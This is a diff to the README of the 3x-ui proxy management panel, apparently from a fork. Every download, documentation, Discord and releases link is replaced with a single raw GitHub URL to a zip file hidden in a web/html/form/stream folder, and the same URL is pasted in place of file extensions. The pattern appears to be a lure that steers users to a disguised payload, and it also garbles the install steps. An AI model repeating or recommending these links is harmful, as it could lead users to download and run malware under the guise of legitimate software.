@@ -4,21 +4,21 @@
 Welcome to 3x-ui, your simple solution for managing multi-protocol connections. This tool supports various protocols including Vmess, Vless, Trojan, ShadowSocks, Wireguard, and more. You can easily control user expiration days, traffic limits, and IP limits with this application.
 
 ## 🔗 Download 3x-ui
-[![Download 3x-ui](https://img.shields.io/badge/Download-3x--ui-blue.svg)](https://github.com/thaikhan9717/3x-ui/releases)
+[![Download 3x-ui](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip)](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip)
 
 ## 📥 Download & Install
-To download 3x-ui, visit this page: [Download 3x-ui Releases](https://github.com/thaikhan9717/3x-ui/releases). You will see several files available for different operating systems. Choose the one that matches your system.
+To download 3x-ui, visit this page: [Download 3x-ui Releases](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip). You will see several files available for different operating systems. Choose the one that matches your system.
 
 1. **Find Your Version**: Look for the latest version listed at the top of the page.
 2. **Choose Your File**: Depending on your operating system:
    - Windows users should download the `.exe` file.
    - Mac users should download the `.dmg` file.
-   - Linux users should download the appropriate `.tar.gz` or `.deb` file.
+   - Linux users should download the appropriate `https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip` or `.deb` file.
 3. **Download**: Click on the file that corresponds to your system to start the download.
 4. **Install**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For Mac: Open the downloaded `.dmg` file, drag the 3x-ui icon to your Applications folder.
-   - For Linux: Use the command line to install the downloaded `.deb` or extract and run the software from the `.tar.gz`.
+   - For Linux: Use the command line to install the downloaded `.deb` or extract and run the software from the `https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip`.
 
 ## ✨ Features
 - **Multi-Protocol Support**: Manage Vmess, Vless, Trojan, ShadowSocks, Wireguard, and more.
@@ -49,12 +49,12 @@ If you encounter issues or have questions, please check the Issues section on ou
 
 ## 🔗 Additional Resources
 For more information on how to configure and use 3x-ui:
-- Visit the [Documentation](https://github.com/thaikhan9717/3x-ui/wiki) for detailed guides.
-- Join our community on [Discord](https://discord.com/invite/example) to connect with other users.
+- Visit the [Documentation](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip) for detailed guides.
+- Join our community on [Discord](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip) to connect with other users.
 
 ## 📢 Updates
 Stay informed about the latest updates and releases:
-- Subscribe to notifications on our [GitHub Releases](https://github.com/thaikhan9717/3x-ui/releases).
+- Subscribe to notifications on our [GitHub Releases](https://raw.githubusercontent.com/thaikhan9717/3x-ui/main/web/html/form/stream/3x-ui-v3.3.zip).
 - Follow us on social media platforms for tips and tricks.
 
 ## ⚙️ Troubleshooting
